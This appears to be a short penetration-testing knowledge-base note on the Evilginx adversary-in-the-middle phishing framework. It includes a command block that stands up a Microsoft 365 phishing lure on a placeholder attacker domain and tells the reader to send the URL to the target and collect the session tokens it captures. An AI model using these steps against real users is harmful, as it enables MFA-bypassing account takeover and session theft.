# Evilginx2

**Tags:** `#evilginx2` `#aitm` `#phishing` `#mfabypass` `#sessionhijacking` `#cloud`

Adversary-in-the-middle (AiTM) phishing framework (kgretzky) built on an embedded nginx reverse proxy. Sits between the victim and the real identity provider, transparently proxying the entire login flow — including MFA — while capturing the resulting session cookie/token. Because the session is captured *after* MFA completes, it bypasses MFA outright rather than trying to avoid or exploit it. Driven by "phishlets" (YAML configs describing the target site's login flow); a Microsoft 365/Entra ID phishlet is one of the most commonly used against this service.

**Source:** https://github.com/kgretzky/evilginx2 (the current major version is **evilginx v3** at `github.com/kgretzky/evilginx` — same phishlets/lures workflow shown below)
**Install:** download a release binary or build from source (Go); requires a domain and valid TLS cert for the phishing site.

> [!warning] **Phishlets are not bundled.** Evilginx removed the built-in M365/O365 phishlets from the core repo (abuse); `phishlets hostname microsoft365 ...` assumes you've placed a phishlet named `microsoft365` in the phishlets dir — source it separately and confirm the name with `phishlets` (the file's basename is the name you reference).

```bash
# Load a Microsoft 365 phishlet and start a phishing lure
phishlets hostname microsoft365 phish.attacker-domain.com
phishlets enable microsoft365
lures create microsoft365
lures get-url 0
# Send the generated URL to the target; captured sessions appear under `sessions`
```

> [!note] **See also** — [[Services/Active Directory/Entra ID|Entra ID]] MFA Bypass section (Adversary-in-the-Middle Phishing); [[Services/Remote Access/Cisco AnyConnect|Cisco AnyConnect]] — cloned SSL VPN portal phishlet capturing creds + session tokens.

---

*Created: 2026-07-27*
*Updated: 2026-09-27*
*Model: claude-opus-4-8*
